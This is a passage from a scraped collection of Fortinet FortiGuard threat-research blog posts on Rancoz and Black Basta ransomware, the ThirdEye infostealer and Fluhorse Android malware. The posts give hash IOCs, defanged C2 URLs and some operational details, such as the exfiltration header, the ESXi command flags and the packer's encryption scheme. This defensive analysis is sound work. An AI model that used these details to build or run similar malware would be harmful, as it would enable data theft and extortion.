while the other does not. They also use different contact email addresses. However, the notes are very similar, and it also replaces the desktop wallpaper like Ramcoz and Buddy ransomware. These similarities aren't too surprising. Many ransomware variants are built on top of existing ransomware code. Recent reports indicate several custom variants based on Vice Society ransomware have also been discovered in the field. This trend, combined with common compilation dates and other similarities, supports our theory that the same developer likely created Rancoz and the other ransomware variants covered in this blog. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Rancoz ransomware variants with the following AV signatures: The other ransomware covered in this blog are also detected as W64/Generik.BPRI!tr.ransom. The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. SHA2 Malware b95a4443bb8bff80d927ac551a9a5a5cfac3e3e03a5b5737c0e05c75f33ad61e Rancoz ransomware d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588 Buddy ransomware da0332ace0a9ccdc43de66556adb98947e64ebdf8b3289e2291016215d8c5b4c Ransomware that resembles the Rancoz Ransomware Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. ransomware,Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-rancoz"
  },
  {
    "title": "New Fast-Developing ThirdEye Infostealer Pries Open System Information",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:The information collected can be used for future attacksSeverity level:Medium FortiGuard Labs recently came across files that look suspicious, even during a cursory review. Our subsequent investigation confirmed that the files are malicious and revealed there is more to them than meets the eye: they are a previously unseen infostealer we have named “ThirdEye”. While this malware is not considered sophisticated, it’s designed to steal various information from compromised machines that can be used as stepping-stones for future attacks. This blog post analyzes the behavior and evolution of this new infostealer. Our investigation began when we spotted an archive file with a file name in Russian, “Табель учета рабочего времени.zip” (“time sheet” in English). This zip file contains two files our experience immediately identified as up to no good. Both files have a .exe extension preceded by another document-related extension (double extension). And one of the files is “CMK Правила оформления больничных листов.pdf.exe” (“QMS Rules for issuing sick leave” in English, which is an executable instead of a document, as the title suggests). The file has a SHA2 hash value of f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494. The ThirdEye infostealer has relatively simple functionality. It harvests various system information from compromised machines, such as BIOS and hardware data. It also enumerates files and folders, running processes, and network information. Once the malware is executed, it gathers all this data and sends it to its command-and-control (C2) server hosted at (hxxp://shlalala[.]ru/general/ch3ckState). And unlike most other malware, it does nothing else. One interesting string unique to the ThirdEye infostealer family (from which we derived its name) is \"3rd_eye\", which it decrypts and uses with another hash value to identify itself to the C2. The second item in the archive is “Табель учета рабочего времени.xls.exe”, which shares the same file name with the parent file. This file is a ThirdEye infostealer variant designed to perform the same activities as f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494. Based on the traits we saw in those ThirdEye infostealer samples, we managed to trace the very first sample to 610aff11acce8398f2b35e3742cb46c6a168a781c23a816de2aca471492161b2, which was first submitted to a public file scanning service on April 4th, 2023. Our analysis of that oldest sample uncovered that it did not harvest as much information as recent samples. The earliest sample we found has a compilation timestamp of Mon Apr 03 12:36:37 2023 GMT and collects the following data: It calculates a “client_hash”, which is used as an identifier. During exfiltration, the collected data is sent to the C2 server with a custom web request header: Cookie: 3rd_eye=[client_hash value] This variant uses hxxp://glovatickets[.]ru/ch3ckState as a C2 server. No significant changes were made to the malware family until a few weeks later. A variant (SHA256: A9D98B15C94BB310CDB61440FA2B11D0C7B4AA113702035156CE23F6B6C5EECF) with a compile timestamp of Wed Apr 26 09:56:55 2023 GMT collected additional data, such as: However, this version would crash in certain virtual machines due to missing hardware information. An updated variant was released one day later (SHA256: C36C4A09BCCDEDA263A33BC87A166DFBAD78C86B0F953FCD57E8CA42752AF2FC). The only change here was the use of a PDF icon. Prior to this, none of the samples we found used a custom/fake icon. “hxxp://ohmycars[.]ru/general/ch3ckState” was used as the C2 by this variant. The following week brought even more changes. This next variant (SHA256: 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337) gathered much more data: While another variant (5D211C47612B98426DD3C8EAC092AC5CE0527BDA09AFA34B9D0F628109E0C796), compiled on Thu May 25 11:02:54 2023 GMT, gathered the same type of data, the main difference was with encoding. Instead of plaintext, the data it collected was encoded in hex. Over the past couple of months, we also spotted some variants that used internal IP addresses 10[.]10[.]30[.]36 in SHA256: 2008BDD98D3DCB6633357B8D641C97812DF916300222FC815066978090FA078F and 192[.]168[.]21[.]182 in SHA256: 847CBE9457B001FAF3C09FDE89EF95F9CA9E1F79C29091C4B5B08C5F5FE48337) instead of an actual C2 server. This was perhaps due to testing new features and/or checking for AV detections. Although there is no concrete evidence that ThirdEye infostealer was used in attacks, the malware is designed to collect information from compromised machines that is valuable for understanding and narrowing down potential targets. We believe this infostealer was designed for that purpose, and ThirdEye victims may be the subjects of future cyberattacks. Since most ThirdEye variants were submitted to a public scanning service from Russia, and the latest variant has a file name in Russian, the attacker may be looking to deploy malware to Russian-speaking organizations. While ThirdEye is not yet considered sophisticated, our investigation found the attacker has put effort into improving the infostealer, such as recent samples collecting more system information compared to older variants. We expect that effort to continue. Fortinet customers are already protected from these APT and cyber-crime campaigns through FortiGuard’s AntiVirus, FortiMail, and FortiClient services, as follows: The following (AV) signatures detect the malicious documents mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Fortinet Webfiltering blocks all ThirdEye C2s identified in this blog. If you believe this or any other cybersecurity threat has impacted your organization, please contactourGlobal FortiGuard Incident Response Team. IOC Malware 9db721fa9ea9cdec98f113b81429db29ea47fb981795694d88959d8a9f1042e6 Archive file containing ThirdEye Infostealer 5d211c47612b98426dd3c8eac092ac5ce0527bda09afa34b9d0f628109e0c796 ThirdEye Infostealer f6e6d44137cb5fcee20bcde0a162768dadbb84a09cc680732d9e23ccd2e79494 ThirdEye Infostealer 3d9aff07e4cb6c943aec7fcd2d845d21d0261f6f8ae1c94aee4abdf4eef5924d ThirdEye Infostealer 2008bdd98d3dcb6633357b8d641c97812df916300222fc815066978090fa078f ThirdEye Infostealer 847cbe9457b001faf3c09fde89ef95f9ca9e1f79c29091c4b5b08c5f5fe48337 ThirdEye Infostealer c36c4a09bccdeda263a33bc87a166dfbad78c86b0f953fcd57e8ca42752af2fc ThirdEye Infostealer 0a798b4e7bd4853ec9f0d3d84ad54a8d24170aa765db2591ed3a49e66323742c ThirdEye Infostealer a9d98b15c94bb310cdb61440fa2b11d0c7b4aa113702035156ce23f6b6c5eecf ThirdEye Infostealer 263600712137c1465e0f28e1603b3e8feb9368a37503fa1c9edaaab245c63026 ThirdEye Infostealer 610aff11acce8398f2b35e3742cb46c6a168a781c23a816de2aca471492161b2 ThirdEye Infostealer hxxp://shlalala[.]ru/general/ch3ckState ThirdEye Infosteler C2 hxxp://ohmycars[.]ru/general/ch3ckState ThirdEye Infosteler C2 hxxp://anime-clab[.]ru/ch3ckState ThirdEye Infosteler C2 hxxp://glovatickets[.]ru/ch3ckState ThirdEye Infosteler C2 FortiGuard Labs has created the following YARA rule to identify the ThirdEye Infostealer. infostealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/new-fast-developing-thirdeye-infostealer-pries-open-system-information"
  },
  {
    "title": "Ransomware Roundup - Black Basta",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Black Basta ransomware. Affected platforms:Microsoft Windows, VMWare ESXi serversImpacted parties:Microsoft Windows and ESXi UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Over the past few months, Black Basta ransomware has made headlines for allegedly compromising high-profile European and North American organizations across a variety of industries, such as outsourcing, technology, and manufacturing. The history of Black Basta ransomware dates back to at least April 2022, with a professional organizations company in the United States being one of its first victims. Since then, Black Basta has slowly expanded their operations, with the group allegedly compromising and stealing data from a US government contractor and a US aerospace and defense company in late 2022. This ransomware is considered a successor to the now-defunct Conti ransomware because some former Conti members are believed to be in the Black Basta group. Some also believe there is a potential connection between Black Basta and the Fin7 threat actor due to the groups' similar Tactics, Techniques, and Procedures (TTPs). Black Basta operates a Ransomware-as-a-Service (RaaS) model, in which the developers offer a service such as ransomware, an infrastructure for payment processing and ransom negotiation, and technical support to its affiliates. Once an affiliate gets a victim to pay a ransom, the Black Basta operator receives a portion. Affiliates are responsible for selecting their targets, moving laterally across a victims’ network (often by using tools supplied by ransomware operators, leveraging dual-use tools, and employing living-off-the-land tactics), stealing data, and deploying the ransomware. Tools reportedly used by Black Basta threat affiliates include PsExec, Windows Management Instrumentation (WMI), PowerShell, Netcat, BITSAdmin, BCDEdit, SystemBC, Mimikatz, ColbaltStrike, Brute Ratel C4, remote access tools, and RClone. Before deploying the ransomware to compromised networks, Black Basta attackers install and configure the open-source file-transfer utility “RClone” to steal the data that they collected. The stolen data is then used for their double-extortion scheme, where the files are leaked to the public if a victim fails to meet the ransom demands. The Black Basta ransomware was initially only supported on Windows platforms. However, the Black Basta developer released a new variant targeting ESXi systems in 2022. The group also updated and released Black Basta ransomware 2.0, which reportedly incorporates a new encryption algorithm. Note that FortiGuard Labs previously released a Threat Signal for Black Basta ransomware on May 2nd, 2022: Black Basta has been seen to use techniques from spearphishing to purchasing access through Initial Access Brokers (IABs) to gain initial access. Access has also been obtained using malware from other groups, such as QakBot (QBot). The exploitation of the PrintNightmare (CVE-2021-34527) and Follina (CVE-2022-30190) vulnerabilities have also been reported. More details on CVE-2021-34527 and CVE-2022-30190 are available as Outbreak Alerts previously released by FortiGuard Labs: FortiGuard Labs is aware that the ransomware component of Black Basta has been compiled as a Windows executable, more recently as a Windows DLL, and additionally as a Linux executable The functionality between the two versions is identical, as is the final step in the attack chain. Black Basta has been observed using the XChaCha20 stream cipher  (https://en.wikipedia.org/wiki/ChaCha20-Poly1305) to encrypt its files. This is built into the software using the Crypto++ C++ library (https://www.cryptopp.com/). Files are encrypted quickly using multi-threading, with the file extension for encrypted files being unique for each ransomware build. The ransom note is assembled and dropped into each directory that includes files that have been encrypted. Note in Figure 6 that the Login ID (the ID used by the threat actor to identify the victim when they make contact) is hardcoded into the ransomware, which suggests some customization for a particular victim. The ransom note labeled “Instructions_read_me.txt” is automatically opened in Notepad so the victim can easily see it. The note demands that the victim use Tor to contact the ransomware gang = at a specified “.onion” site. Instructions for downloading and installing the Tor browser are provided. It also suggests that the victim not contact a recovery company or outside ransom negotiators. Black Basta has also developed a Linux executable primarily designed to target VMWare ESXi deployments rather than more general individual Linux systems. This can be easily shown by running the ransomware on a non-ESXi deployment. When executed, the malware will be unable to locate the “/vmfs/volumes/” directory and be unable to run. This directory (VMFS is the “Virtual Machine File System,” and “volumes” is where VM disk images reside, which would be the main target of the ransomware). If that folder is then put in place, it will execute (although nothing will occur on a non-ESXi host). The Linux version of Black Basta has several command line flags that suggest it is designed to be executed by an individual who has remote access to a victim ESXi server. Again, executing in a non-ESXi environment fails. However, it allows for the tracing of the event in assembly. The “-killesxi” command triggers a fairly involved Bash sequence, as shown in Figure 12 below. As ESXi installations are the primary focus of the Black Basta Linux variant, it is only interested in four related file types for encryption: “.vmsd”, “.vmx”, “vmxf”, and “vmdk”. As with the Windows version, the Linux version of Black Basta hardcodes the file extension for encrypted files into the code for deployment, and it changes from file to file. Whether using the “-forcepath” command line flag to encrypt a single, non-standard directory with files of interest or the default location of “/vmfs/volumes/”, this version will encrypt files as efficiently as the Windows version. The ransom note for the Linux version of Black Basta is identical to the Windows version. Again, the victim must contact the gang at a specified “.onion” site. As the ransom notes above show, the Black Basta threat actors want their victims to contact them at a specific Tor address. Once there, the site requires the visitor to enter their “Login ID” from the ransom note to identify the organization they’re from, along with the completion of a captcha to prevent automated connections. In addition to the communication site, Black Basta operates a “name and shame” Tor site titled “Basta News”. This site provides the group’s “proof” that it has compromised a given organization, publication status, and visitor count. During our investigation, Black Basta’s data leak site listed more than 200 victims in North America and Europe. More than 60% of the alleged victims are U.S. organizations. Distant second place belongs to Germany at 15%, followed by Canada at close to 6%. We divided the victim list into four groups: older victims to newer victims. While the oldest victim group spreads across 12 countries, the second and third group victims include only eight countries. The latest victim group has only six countries (U.S., Germany, Canada, Italy, UK, Slovenia), which may indicate that Black Basta affiliates have narrowed the target list. As for its targeted industries, more than 25% of the victims listed on the leak site are in manufacturing, construction, service, and retail. However, 50% of the victims are in those four industries. Other affected sectors include legal, warehouse, finance, and IT. Based on what’s in the data leak site, over 80% of the victims suffered from some or all of their stolen data being leaked to the public. Fortinet customers are already protected from this malware variant through AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Black Basta ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. The following IPS signatures are in place for CVE-2021-34527 and CVE-2022-30190 respectively: FortiEDR detects and blocks the execution of Black Basta ransomware before it can execute. FortiEDR detects and blocks Black Basta ransomware from deleting volume shadow copies using the vssadmin utility with a security event triggered by the 'Suspicious Applicaiton' rule within the Ransomware Prevention security policy. FortiEDR detects and blocks Black Basta ransomware from encyrpting files within the \"file Encryptor - Suspicious File Modification\" rule in the Ransomware Prevention security policy. FortiEDR detects and blocks Black Basta ransomware from changing the desktop background a 'Modify OS Setting' event triggered by the 'Unconfirmed Executable' rule in the Ransomware Prevention security policy. Note:If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. SHA2 Malware 0180364e7dd8b5440920f1a85330bc5ec7e80756cb633014846378b9a5c9debd Black Basta ransomware Black Basta ransomware Black Basta ransomware 03309c90e6c60a2e3cd44374efa3003ae10cd9e05ba6a39c77aa5289b32cb969 0595876dcfb02cbe4d85d3f9cb374b24473e5b338df781e18bd059ea48d60119 0825ae48606f05086efb7d2d03db4331a03e21017bdf1470cdc597c51381e6f5 08376a7b9bad22cc76ed74bcf1ff3c36fd26549c747e251980439074c0a22b65 09bc7247b50a166996b667b9a6e696cfbafa203ffcbec46ad0cca27deacd5c25 0bce6dc27d2cbdc231b563427c3489ddc69a0a88012abccd49b32c931dd93a81 0d6c3de5aebbbe85939d7588150edf7b7bdc712fceb6a83d79e65b6f79bfc2ef 10cd56acdf1bc7e91610f18583c4f88dc2f64a3caaf4faa8a3bccf3938599245 1354254499b2e3353708747d36c334074f40c1f726ea7590384f2192c972f8c3 1391c20a26f248f7c602f20096bf1886cfe7e4d151602a1258a9bbe7c02c1c80 1552079359d5e51fb862c3be8cc0dacaa5ae39b43255b87a9c185414944f8c43 15560b1e35a3a8612a7ba91d00dea6b8dd6e4f3f857399c22c0c75377c9b31a2 158e40a0009e6602303952694df6f3a49f40705c7ceb8b85854c0f1733aa2963 15abbff9fbce7f5782c1654775938dcd2ce0a8ebd683a008547f8a4e421888c4 17205c43189c22dfcb278f5cc45c2562f622b0b6280dcd43cc1d3c274095eb90 1a8a283732f920d34233eac14ab03d681f3837b2e759df4ff1dd383249074e46 1bb7e645d4ff753157bbdd78829276356cb6660a767ab7158fc7dec3fe8b0e2f 1c711ca465dace4d2a8d0542e75410c417375c4ee484294fcd959e99651fccb8 1dd04aab97d6b65ac93ae3e8cfb4d3175d99f5b0395418abeb771d2db364cd3c 1ed076158c8f50354c4dba63648e66c013c2d3673d76ac56582204686aae6087 203d2807df6ef531efbec7bfd109986de3e23df64c01ea4e337cbe5ba675248b 21033cd24a9d775d7daa7bbc5c5b007553f205ac0febb6bae3fa35c700676bda 22aba8e0bdbc9d50f6070ec50405c8ef31e5e22ad18fa9cc94d137fee0dd0536 2327018dab0e3beaed2123bcb5392405ab1e502dfa72a5a32c2c164346bb9bc6 240450721e47d4cabc1d15d074f0a3a7b3e0b9f1a791006046e211ec302c28b0 245af5ac27f701bf320971c69f9317b37faaac228731a77fb06ad9944c9b6772 2558d0817586306d0ddf7beadd371785cd0a0b7ed860ac62760dbbc92866008a 2e2ec16d0b77bddbc2e88a0a914e7466a3c9dee38dc73a66dddd005e92bb3d6e 2edcf98e7031dad7d90df525db2951b83b2a82de57dfe853c98eaedb609e49c4 2f8796499a7df61817126eb00c8aedff7b709f7f652503b2b9bd1c6a2f7f61e4 31e2288f0dd395423c22d2d20c9562211e97a2ab06d2403cf020203abe835993 3276df5b3b112c052d56919ad33de8404ec1a37d47d2c28d9debf8323df22e16 350ba7fca67721c74385faff083914ecdd66ef107a765dfb7ac08b38d5c9c0bd 41b3d0d4419eac75017e76fe3bd76ec6a968cb68af4cf6335a27a196c47bac25 434a4f21549a1ae3dd623bfbc084d43c330821a279b2f4a4abdc7ca6e5584bfb 43e43276e250fc8a971fc3f0308827f98df09c52c08a09577b0cf636e9dc65ed 43f475bfa1f2c4fc35f08e6a96ca9698bd6f86357564d82436555e0f43aeff1a 47df319462909cbbcc0f2c1ab1fc4eec5363cae8344f9e4033542f221da97677 49ec36f03629f5993e496cfee6c5274c5f1db49bde704ef77ffe05fedd60e82b 4b83aaecddfcb8cf5caeff3cb30fee955ecfc3eea97d19dccf86f24c77c41fc4 4fa2e370c3e78afb50cdeac32b9b4f3e5262312b04b461d05ff73678f5526530 50d2d4c05bf810c1b57dd93f41430ddcd93838cc5367ed2c81de4563f59860c9 51eb749d6cbd08baf9d43c2f83abd9d4d86eb5206f62ba43b768251a98ce9d3e 5211ad84270862e68026ce8e6c15c1f8499551e19d2967c349b46d3f8cfcdcaa 5c6c40ddb666fe8b3a85fef39b6594337ebc6607b5eb9a4f16a62efc4402a0cb 5caa3f9665561b5b02f944cc33fb12faaec87d6ccb69af6a12d0f82cd0a5981d 5dcbec6d3370a2af103500325279d0c4f53df4c5a0c85b20a467797e61cb75ae 5ed057e99aed8356ccdf698f38fd3fe9ceabe517e1bd3245479fdd3cbb966fa9 60e9e8e25b64eabb59dc8667c286d91a8f4c6b6f9ea9aa12b55e7a2cb78d15f8 6264cae0ef62128667a295aef7154f4feb22dbfe53fc09fd01d122e01d43995e 645a18f737bd6d810a48c4a47ace62c196eb1ef285f8ca9bea6218b312fff16e 64921e6be1c8f44fddc6075621357496561924acecce48b73a243d5534c8d36e 653da5127b0ecbc5c373ce510c0d5191f61f2df912c9b6f4989aa3775933bc33 6b7d80a4e6b7b6d2a74f135313473415ecbbd7382688d0b536a7df6a7ccb2bab 6c0690782c3bfd790eddf460cba5b89769d740e78db90b56a54964ebffc9fb17 6cd7c9fa8314f2d7fb6819df38cffa1cccbd6f41b54c81bc6a667693351b3058 6cd92db9ebc8a8a879d86002971b93562928eca738a2fe14228479cb6cc1fe33 6cf61f55d7c40c703289b5692f7563c01d7bad54a2f5baf378a0e866622368e6 6def732c9ae7a4ce0dfd9d711033eed64fb5f481b56768c374289572c2743a0f 6ecd381ce0d3ad1ab83147712aa34772351e4d2dc43e1b66e3a999340e2b7f17 70161408185668a27da9d35ce4127003bda1acb6e31d9b01b576e64c17ec07cf 723d1cf3d74fb3ce95a77ed9dff257a78c8af8e67a82963230dd073781074224 75f247f236a1f650c607e27d13b1c769340263f6b8caac946b0f1dacc5180b78 764b1117262d33f0a69b4f4c72fad607b7c71c262f60b9b2b35a21e7f4967786 7883f01096db9bcf090c2317749b6873036c27ba92451b212b8645770e1f0b8a 7ab838960858870eaf2701a737411c6a65e00077136d938f4ef736b3c949833d 811e64d302089f4cb3cf7922c4310a1a00ef0a71c44ff402c1bf35c49c481f9e 81515e1c72fadae2c4bb15883e0c1d8979b49fd52d8c65ca03e05a75ca6683c9 83fc7095a91dc016bdbd965ae09182ea1d1a5b287cbfa4b0f3a58754336c8c33 856b5dc509c17f5be68186b6a8ab272fc0dd12000c978548d8488ee997b015e5 882019d1024778e13841db975d5e60aaae1482fcf86ba669e819a68ce980d7d3 8ded024d7fb62074d19cb9a364ca34646df42c971b9208227abc8bcb454d49f5 9770b4425a2c68ac8a861f3d5b484fad3c7bd7ea7a763248ad841821e19a01bc 97a997a2a3b270a4db3b56fec30319bc0f41f069a5089c47f08e4c554bf3ac32 99f82c9a80fc6556f28e50e2889d59325e8169dc3742bf34121dc85207c6d965 9b57d94b33cd712bf409e0128f26a75d2d9746ef65012ce6cd72caf47650d2a6 a083060d38984e7c6f36dcd2c57ec1aa3f50f9c201c8538257c8cbf2b3217e96 a252719d1712ec5aa37a8ce6e84474584c7d8d8221fa5aa033f32f5f5cf6d484 aa9f5321e9c5bede88d8f50342e9420f9ace7711950c9fae8536a0d5586ef86d ab24df3877345cfab2c946d8a714f1ef17fe18c6744034b44ec0c83a3b613195 ae7c868713e1d02b4db60128c651eb1e3f6a33c02544cc4cb57c3aa6c6581b6e af75686852f329855981dd5953ff8ce40e713e6ef720ac26816091f40fede1a8 affcb453760dbc48b39f8d4defbcc4fc65d00df6fae395ee27f031c1833abada b18b40f513bae376905e259d325c12f9d700ee95f0d908a4d977a80c0420d52e b4749c9a449bc87703dda9db60e4562f0bd02c055c49c14704ed2d1e2eb0f4f6 b95487d9ee09dba89976b9b61b3eeb82f72972f270ca149ac0e2e1ea35640d5f c4c8be0c939e4c24e11bad90549e3951b7969e78056d819425ca53e87af8d8ed c5320ee1e5753c5cec7611e4c61aaf23778b5924aefac3a546318de7319581bc c532d28f9700abba1a4803c3a9d886c8c4fb26f84cf2399c533d68cfdcec4fa7 cb0848a6f24a6a37bbceffa8dedade918f3a0717ceeff63bbb997b608823214f cce74c82a718be7484abf7c51011793f2717cfb2068c92aa35416a93cbd13cfa cf7fa7f54b06b09b750b8c50e4f8893e25ceaccfa9be8225f3279dc4e4ce0f4d d0f05cd6957e1e93d1ca4154762b4d4bcaeb16c0bf878b59a1500c4974ef4502 d1949c75e7cb8e57f52e714728817ce323f6980c8c09e161c9e54a1e72777c13 d408fe3421f520710e8a6ac6f0b9a1759b03ab3f44134e451d72af3bb79a3ad0 d5770cd6451de0c45426fae230e41f3551af1c9dda690d2be44f69be3721d929 dc90ba17158501e8f6589d3805789f9ac51cefaafec63d6e00e10c7e0355faab dd32c037ed9b72acb6eda4f5193c7f1adc1e7e8d2aefcdd4b16de2f48420e1d3 df5b004be71717362e6b1ad22072f9ee4113b95b5d78c496a90857977a9fb415 e05791112b72f7430b74138bac4d4efcd2fbd1909714f8366a43eab77b26b13e e28188e516db1bda9015c30de59a2e91996b67c2e2b44989a6b0f562577fd757 e686a6e3b9598c588202794f7670c2356e7bc80ecb69113eb3062ae4b57e7396 e9fefd053b8c77c7db13d528b97d2b974dfd86775a8cc9c53b8efdb07db8842c eb758d64b49aec914b175165f232aeb8928a841566c083114e97844841afd82c ef2a754a8e713fd6deaa642e2220af372fd310a755a02126938ff233b16a4a83 f0addbafed09fa1d3a5edfe56356475f1af5d711403c800617bcde9b22585d24 f4f471241714fbf24a103f8a7fce00fecdf795dbf6edbc6420e34834cb93eb53 f79188b716aeb2eaa34bce17f066aca3bbdf676b7977fe36b8277fd651dea251 fbe5690e3a17947a9e208a1730d08e2496f27e1c62cac146fb567c63d781a1b6 fe87fa7714266548fa5da52455f1788f588417ee800c86768d163abd279d0279 fff35c2da67eef6f1a10c585b427ac32e7f06f4e4460542207abcd62264e435f Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup,fortiguard labs,ransomware attack FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-black-basta"
  },
  {
    "title": "Fortinet Reverses Flutter-based Android Malware “Fluhorse”",
    "content": "FortiGuard Labs Threat Research Android/Fluhorseis a recently discovered malware family that emerged in May 2023. What sets this malware apart is its utilization of Flutter, an open-source SDK (software development kit) renowned among developers for its ability to build applications compatible with Android, iOS, Linux, and Windows platforms using a single codebase. While previous instances of threat actors using Flutter for malware exist, such asMoneyMonger, they actually used Flutter for its cross-platform UI elements without carrying the actual malicious payload. So, despite Flutter application reversing being notoriously difficult, MoneyMonger can actually be quite easily reversed with the usual Android reversing techniques. The Android/Fluhorse family represents a significant shift asit incorporates the malicious components directly within the Flutter code. This blog post covers insights on two notable aspects: 1.        The Fluhorse campaign of May had basic obfuscation and no packing.In June, however, the sample we analyzed was packed. This is evidence that malware authors are moving to the next step of maturity. 2.Reverse engineering technique. Reversing Flutter applications is widely considered a challenging endeavor. Many researchers treat it as a black box, only analyzing those components that can be observed from the outside.Some employ dynamic instrumentation tools, like re-Flutter and re-flutter-demo, which come with their own complexities and risks associated with running malware in controlled environments. But for our analysis, we successfully managed tofully reverse-engineer the Fluhorse malware in a static manner, without the need for dynamic execution. Note that Fortinet customers are fully protectedagainst this family of malware. These samples are detected as Android/Fluhorse.A!tr.spy or Android/Packed.57103!tr, and all related URLs mentioned in this blog are detected and blocked. The malware we analyzed posed as a legitimate app for anelectronic toll systemused in Southern Asia. It lures the victim into entering his/her credentials, steals them, and also steals 2FA (two-factor authentication) codes by listening to incoming SMS and forwarding them to a website controlled by the attackers. Victims typicallyinstall the malware via e-mail phishing campaigns, with previous  research claiming that Fluhorse has been downloaded over 100,000 times. The current version we analyzed (SHA256: 2c05efa757744cb01346fe6b39e9ef8ea2582d27481a441eb885c5c4dcd2b65b) was first seen on June 11, 2023. It is distributed from the malicious URL hxxps://fasd1[.]oss-ap-southeast-1.aliyuncs.com/ETC.apk. FortiGuard’s telemetry shows it has been being accessed from Asia since June 12. The sample is packed, concealing the encrypted payload within the wrapping application’s Dalvik executable, classes.dex. The packer adds a 4-byte integer at the end of the DEX that includes (1) the size of the encrypted payload and, just before that, (2) the encrypted payload. Decryption is performed at the native level(to harden reverse engineering) using OpenSSL’s EVP cryptographic API. The encryption algorithm is AES-128-CBC, and its implementation uses the same hard-coded string for the key and initialization vector (IV). From a cryptographic point of view, this is a bad idea as the IV is not meant to be confidential. The decrypted payload is a ZIP file that contains another DEX. The payload is then installed (the packer’s 